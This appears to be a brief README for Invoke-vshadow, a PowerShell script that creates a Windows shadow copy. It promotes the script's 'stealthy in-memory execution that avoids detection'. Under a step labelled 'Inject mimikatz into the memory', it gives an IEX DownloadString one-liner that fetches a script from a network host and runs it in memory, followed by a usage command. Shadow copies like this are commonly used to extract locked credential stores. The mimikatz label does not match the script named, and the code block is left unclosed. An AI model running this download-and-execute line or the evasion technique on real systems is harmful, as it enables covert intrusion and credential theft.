# Invoke-vshadow
Using Invoke-vshadow in PowerShell offers stealthy in-memory execution that avoids detection by not writing files to
disk, making it ideal for security assessments with minimal system footprint. The script creates a shadowcopy and outputs detailed information about it. Basically it provides the functionality of 'vshadow.exe -nw -p' within PowerShell.

## Deliver
1. Start a Powershell with administrative privileges
2. Inject mimikatz into the memory:
```
IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.165/Invoke-vshadow.ps1')

## Usage
```
Invoke-vshadow -volume 'C:\'
```
